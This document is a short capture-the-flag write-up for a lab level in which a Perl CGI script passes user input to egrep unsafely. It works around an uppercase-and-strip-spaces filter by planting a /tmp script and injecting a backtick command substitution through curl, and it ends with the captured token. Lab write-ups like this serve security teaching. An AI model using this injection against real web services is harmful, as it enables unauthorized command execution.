#a perl script can be found in the directory with flag12 rights
#depending on machine, might have to export LC_ALL=en_US.UTF-8

#this time we have an unprotected egrep on user input string
#however, the input string goes through some manipulation

$xx =~ tr/a-z/A-Z/;
#changes lowercase to uppercase

$xx =~ s/\s.*//;
#removes spaces

#therefore we cannot input the command directly through the string
#but we can inject the path to a script that will run getflag, as long as
#the path has no spaces or lowercase letters

touch /tmp/RUNME
echo "getflag > /tmp/token" > /tmp/RUNME
chmod +x /TMP/RUNME

#similar to level04 this script uses CGI, and its defined webserver is localhost:4646
#we can use curl to pass the path parameter that be assigned to $xx

curl http://localhost:4646?x=\`/*/RUNME\`
cat /tmp/token
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
